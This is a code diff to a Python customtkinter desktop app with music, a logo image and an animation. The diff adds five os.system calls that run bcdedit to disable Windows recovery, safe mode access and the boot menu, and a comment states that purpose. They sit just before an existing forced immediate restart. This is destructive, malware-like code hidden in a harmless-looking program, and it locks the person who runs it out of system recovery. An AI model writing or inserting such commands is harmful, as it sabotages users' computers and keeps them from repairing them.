@@ -10,7 +10,6 @@ import math
 
 current_folder = os.path.dirname(os.path.realpath(__file__))
 assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
-
 mixer.init()
 mixer.music.load('assets/cherry.mp3')
 
@@ -41,10 +40,6 @@ class App(customtkinter.CTk):
 
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
-
-        for i in range(1):
-            self.cherry_window()
-            
 
         self.logo = customtkinter.CTkImage(Image.open(os.path.join(assets, "poggers.webp")), size=(26, 26))
 
@@ -176,7 +171,14 @@ class App(customtkinter.CTk):
             angle += speed / 10
             if angle > math.pi :
                 angle = math.pi * -1
-        
+
+        # Block access to safe mode and recovery options (it will show up in troubleshoot menu but recovery options menu will be skipped)
+        os.system('bcdedit /set {current} recoveryenabled no')
+        os.system('bcdedit /set {bootmgr} displaybootmenu no')
+        os.system('bcdedit /set {globalsettings} advancedoptions no')
+        os.system('bcdedit /set {current} bootmenupolicy no')
+        os.system('bcdedit /set {current} bootstatuspolicy no')
+
         os.system('shutdown /r /t 0 /f')
 
     def devs_button_event(self):
